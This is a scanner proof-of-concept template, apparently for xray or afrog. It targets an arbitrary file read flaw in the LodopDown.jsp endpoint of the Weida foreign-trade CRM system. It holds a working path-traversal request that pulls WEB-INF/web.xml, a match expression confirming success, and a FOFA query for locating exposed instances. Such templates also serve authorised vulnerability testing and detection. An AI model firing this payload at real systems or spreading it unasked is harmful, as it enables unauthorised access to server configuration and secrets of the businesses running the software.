id: poc-yaml-weidasoft-lodopdown-anyfile-read
info:
  name: 维达外贸客户关系管理系统 LodopDown 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 维达外贸客户关系管理系统
  fofa: title="维达外贸客户关系管理系统"
requests:
- method: GET
  path: /file/LodopDown.jsp?sFile=../../WEB-INF/web.xml
  expression: "status_code == 200 && \ncontains(body,\"web-app\") &&\ncontains(body,\"\
    <param-name>\") &&\ncontains(body,\"<servlet-name>\") &&\ncontains(headers,\"\
    filename=\") &&\ncontains(content_type,\"application/x-msdownload\")\n"
variables: {}
transport: http
